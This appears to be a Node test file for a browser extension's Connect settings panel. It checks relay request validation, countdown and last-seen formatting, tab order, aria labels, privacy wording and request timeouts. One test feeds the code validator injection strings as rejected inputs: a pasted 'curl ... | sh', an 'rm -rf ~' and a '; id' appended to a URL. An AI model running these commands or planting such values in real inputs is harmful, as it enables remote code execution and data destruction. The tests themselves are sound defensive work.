// The side panel's Connect pieces that don't need a browser: the relay's first check, the text
// helpers, and the header, tab and welcome wiring the UX review asked for.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { checkConnectRequest } from "../src/connect/check.ts";
import { connectorUrl, countdown, lastSeen, linkCommand } from "../src/connect/format.ts";
import { CONNECT_METHODS } from "../src/connect/types.ts";

const repo = join(dirname(fileURLToPath(import.meta.url)), "..");
const read = (f) => readFileSync(join(repo, f), "utf8");

test("the relay passes only known methods with object params, and names the id of a refused one", () => {
	assert.deepEqual([...CONNECT_METHODS], ["status", "approvalCode", "deviceCode", "setBusy", "joinHub", "setTheme"]);
	assert.deepEqual(checkConnectRequest({ id: 1, method: "status" }), { ok: true, request: { id: 1, method: "status" } });
	assert.deepEqual(checkConnectRequest({ id: 2, method: "setBusy", params: { busy: true } }).request.params, { busy: true });
	for (const bad of [{ id: 3, method: "link.off" }, { id: 3, method: "__proto__" }, { id: 3, method: 5 }, { id: 3, method: "status", params: [] }, { id: 3, method: "status", params: "x" }, { id: 3, method: "status", params: null }]) {
		const r = checkConnectRequest(bad);
		assert.equal(r.ok, false, JSON.stringify(bad));
		assert.equal(r.id, 3);
	}
	for (const bad of [null, undefined, "status", { method: "status" }, { id: "1", method: "status" }]) assert.equal(checkConnectRequest(bad).ok, false);
});

test("countdown and last-seen read as a person would say them", () => {
	assert.equal(countdown(10 * 60_000, 0), "10:00");
	assert.equal(countdown(9 * 60_000 + 41_000, 0), "9:41");
	assert.equal(countdown(65_000, 0), "1:05");
	assert.equal(countdown(1000, 1000), "");
	assert.equal(countdown(0, 5000), "");
	const now = Date.parse("2026-11-02T12:00:00Z");
	assert.equal(lastSeen(null, now), "never");
	assert.equal(lastSeen("garbage", now), "never");
	assert.equal(lastSeen("2026-11-02T11:59:30Z", now), "just now");
	assert.equal(lastSeen("2026-11-02T11:59:00Z", now), "1 minute ago");
	assert.equal(lastSeen("2026-11-02T11:55:00Z", now), "5 minutes ago");
	assert.equal(lastSeen("2026-11-02T09:00:00Z", now), "3 hours ago");
	assert.equal(lastSeen("2026-11-01T11:00:00Z", now), "1 day ago");
	assert.equal(connectorUrl("https://h.example.com"), "https://h.example.com/mcp");
	assert.equal(linkCommand("https://h.example.com", "TK-ABCD-EFGH"), "tabkyra link https://h.example.com --code TK-ABCD-EFGH");
});

test("Settings has the eight tabs in the spec's order, and Bridge is now Agents", () => {
	const panel = read("src/sidepanel.ts");
	const start = panel.indexOf("SettingsPage.open([");
	const list = panel.slice(start, panel.indexOf("]);\n", start));
	// Top-level entries only: a tab, or a combined tab by its name.
	const order = list
		.split("\n")
		.map((line) => /^\t\t(?:new CombinedTab\("(\w+)"|new (\w+)\(|(providers),)/.exec(line))
		.filter(Boolean)
		.map((m) => m[1] ?? m[2] ?? m[3]);
	assert.deepEqual(order, ["providers", "BridgeTab", "ConnectTab", "SkillsTab", "Privacy", "AppearanceTab", "CostsTab", "About"]);
	assert.match(read("src/dialogs/BridgeTab.ts"), /getTabName\(\): string \{\s*return "Agents";/);
	assert.match(read("src/dialogs/ConnectTab.ts"), /return "Connect";/);
	assert.match(read("src/dialogs/AppearanceTab.ts"), /return "Appearance";/);
});

test("the welcome dialog offers Connect, and Set up provider lands on the API keys list", () => {
	const welcome = read("src/dialogs/WelcomeSetupDialog.ts");
	assert.match(welcome, /Use from claude\.ai or ChatGPT/);
	assert.match(welcome, /Set up provider/);
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /choice === "connect" \? \{ tab: "Connect" \} : \{ tab: "Providers", anchor: "api-keys-heading" \}/);
	assert.match(read("src/dialogs/ApiKeysTab.ts"), /id="api-keys-heading"/);
});

test("with no provider the composer's model button reads Add a provider", () => {
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /if \(providerless\)\s+return \{ content: "Add a provider"/);
	assert.match(panel, /provider-key-saved", "provider-key-removed"/);
});

test("every icon-only header button has an aria-label and a visible tooltip", () => {
	const panel = read("src/sidepanel.ts");
	// headerButton sets both from one label.
	assert.match(panel, /function headerButton\([^)]*\)[\s\S]{0,200}aria-label=\$\{label\} data-tip=\$\{label\}/);
	for (const label of ["Past chats", "New chat", "Settings"]) assert.match(panel, new RegExp(`headerButton\\("${label}"`));
	// The More menu button carries both too.
	const menu = read("src/components/HeaderMenu.ts");
	assert.match(menu, /aria-label=\$\{this\.label\}\s+data-tip=\$\{this\.label\}/);
	assert.match(panel, /<tk-header-menu \.items=\$\{moreMenuItems\(\)\} label="More">/);
	// The recording pill and the Artifacts button too.
	assert.match(panel, /aria-label="Stop recording and save as a skill"\s+data-tip="Stop recording and save as a skill"/);
	// The theme items left the More menu; one Theme entry opens Appearance.
	assert.doesNotMatch(panel, /Light theme|Dark theme|Match the system/);
	assert.match(panel, /label: "Theme"[^}]*openApiKeysDialog\(\{ tab: "Appearance" \}\)/);
});

test("Privacy keeps one sentence visible and every long explanation under Details, text unchanged", () => {
	const text = read("src/dialogs/PrivacyTab.ts");
	assert.equal((text.match(/>Details</g) ?? []).length + (text.match(/<summary[^>]*>Details/g) ?? []).length >= 2, true);
	// The original explanations survive word for word.
	for (const kept of [
		"The side panel agent then runs only OpenRouter models, sent with zero data retention required and no",
		"Ollama cloud model) is still a cloud service: don't use one in private mode.",
		"Prefer names over IPs (for example mac.example.ts.net): a listed IP is trusted on every network, including one where it belongs to someone else.",
		"Keeps a copy of your side panel chats in ~/.local/share/tabkyra/threads (readable only by your user), so",
		"Nothing is sent: you review the report here, copy it, and paste it into a GitHub issue yourself.",
	]) {
		assert.ok(text.includes(kept), `missing: ${kept}`);
	}
});

test("Page scripts reads as one plain sentence with the old wording under Details", () => {
	const text = read("src/dialogs/BridgeTab.ts");
	assert.match(text, /Turning this on makes agents' page scripts run faster\./);
	assert.match(text, /Tabkyra has not been granted the userScripts permission\./);
	assert.match(text, /<summary class="cursor-pointer text-foreground">Details<\/summary>/);
	// The jargon is no longer a visible line.
	assert.doesNotMatch(text, /line\(\s*['"]Off: Tabkyra has not been granted/);
});

// ---------- round-1 review fixes ----------

test("a code reply is drawn only when the code is TK-XXXX-XXXX and the origin an origin", async () => {
	const { validApprovalCode, validDeviceCode } = await import("../src/connect/format.ts");
	const soon = Date.now() + 600_000;
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "https://hub.example.com" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "http://127.0.0.1:8787" }), true);
	for (const code of ["TK-ABCD-EFGH; curl https://x.example | sh", "TK-ABCD-EFGH\nrm -rf ~", "tk-abcd-efgh", "TK-ABCD", "", 5, undefined]) {
		assert.equal(validApprovalCode({ code, expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), false, String(code));
		assert.equal(validDeviceCode({ code, expiresAt: soon, hubUrl: "https://hub.example.com" }), false, String(code));
	}
	for (const hubUrl of ["https://hub.example.com/x", "https://hub.example.com; id", "hub.example.com", "https://a b", "", undefined]) {
		assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl }), false, String(hubUrl));
	}
	for (const connectorUrl of ["https://hub.example.com", "https://hub.example.com/mcp?x", "https://hub.example.com/mcp; id", undefined]) {
		assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl }), false, String(connectorUrl));
	}
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: "soon", connectorUrl: "https://hub.example.com/mcp" }), false);
	assert.equal(validApprovalCode(undefined), false);
	// The tab checks at mint and again before it draws a code box or the command that carries one.
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(!validApprovalCode\(made\)\) throw/);
	assert.match(tab, /if \(!validDeviceCode\(made\)\) throw/);
	assert.match(tab, /validApprovalCode\(this\.approval\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) && countdown/);
});

test("Busy has its own error line that the status poll does not clear, and the switch follows the host", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const load = /private async load\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.doesNotMatch(load, /busyError/, "load() must not clear the busy error");
	const setBusy = /private async setBusy[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.match(setBusy, /this\.busyError = err instanceof Error/);
	assert.doesNotMatch(setBusy, /this\.error =/);
	assert.match(tab, /\$\{this\.busyError \? html`<p[^>]*role="alert"/);
	assert.match(tab, /\.checked=\$\{live\(link\.busy\)\}/, "a refused toggle snaps back even when the value did not change");
});

test("the join form is hidden while the helper reports a config problem; loading, minting and joining reset in finally", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(s\.route !== "none" \|\| s\.problem\) return nothing;/);
	for (const name of ["load", "mint", "setBusy", "join"]) {
		const body = new RegExp(`private async ${name}\\([\\s\\S]*?\\n\\t\\}\\n`).exec(tab)[0];
		assert.match(body, /finally \{/, `${name} resets its flag in finally`);
	}
	assert.match(/private async join\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /finally \{\s*this\.joining = undefined;/);
});

/** A chrome.runtime.connect whose port records what is posted and lets the test answer. */
function fakePort() {
	const port = { posted: [], listener: undefined, onDisconnect: undefined };
	globalThis.chrome = {
		runtime: {
			connect: () => ({
				postMessage: (m) => port.posted.push(m),
				onMessage: { addListener: (f) => (port.listener = f) },
				onDisconnect: { addListener: (f) => (port.onDisconnect = f) },
			}),
		},
	};
	return port;
}

test("a request the helper never answers fails with no_reply after 20 s (30 s for joinHub), and an answer cancels the timer", async (t) => {
	t.mock.timers.enable({ apis: ["setTimeout"] });
	const port = fakePort();
	const client = await import("../src/connect/client.ts?timeout");
	assert.equal(client.REQUEST_TIMEOUT_MS, 20_000);
	assert.equal(client.JOIN_TIMEOUT_MS, 30_000);

	const status = client.connectStatus().catch((e) => e);
	t.mock.timers.tick(19_999);
	assert.equal(port.posted.length, 1);
	t.mock.timers.tick(1);
	const err = await status;
	assert.ok(err instanceof client.ConnectRequestError);
	assert.equal(err.code, "no_reply");
	assert.equal(err.message, "Tabkyra's helper didn't answer. Update it: tabkyra update");
	assert.equal(client.isNoHost(err), false);
	// A late answer for the forgotten request is ignored.
	port.listener({ id: port.posted[0].id, result: { route: "none" } });

	// joinHub gets 30 s, and progress from the helper restarts the wait.
	const steps = [];
	const join = client.connectJoinHub("https://hub.example.com", "TK-ABCD-EFGH", undefined, (s) => steps.push(s)).catch((e) => e);
	const joinId = port.posted.at(-1).id;
	t.mock.timers.tick(29_999);
	port.listener({ id: joinId, progress: { step: "service" } });
	t.mock.timers.tick(29_999);
	assert.deepEqual(steps, ["service"]);
	port.listener({ id: joinId, result: { name: "laptop", manage: false } });
	assert.deepEqual(await join, { name: "laptop", manage: false });
	t.mock.timers.tick(120_000); // nothing left to expire

	// An answer in time resolves and leaves no timer behind; a lost port rejects what is waiting.
	const ok = client.connectStatus();
	port.listener({ id: port.posted.at(-1).id, result: { route: "none" } });
	assert.deepEqual(await ok, { route: "none" });
	const lost = client.connectApprovalCode().catch((e) => e);
	port.onDisconnect();
	assert.equal((await lost).code, "no_host");
	t.mock.timers.tick(120_000);
});

test("the relay forgets a request the host never answers, and clears the timer when it is answered or the panel leaves", () => {
	const relay = read("src/connect/relay.ts");
	assert.match(relay, /export const RELAY_WAIT_MS = 60_000;/);
	assert.match(relay, /const forget = \(hostId: number\)[\s\S]*?clearTimeout\(waiting\.get\(hostId\)\?\.timer\);\s*waiting\.delete\(hostId\);/);
	assert.match(relay, /if \(message\.error \|\| reply\.result !== undefined\) forget\(message\.id\);/);
	assert.match(relay, /if \(w\.port === port\) forget\(hostId\);/);
});
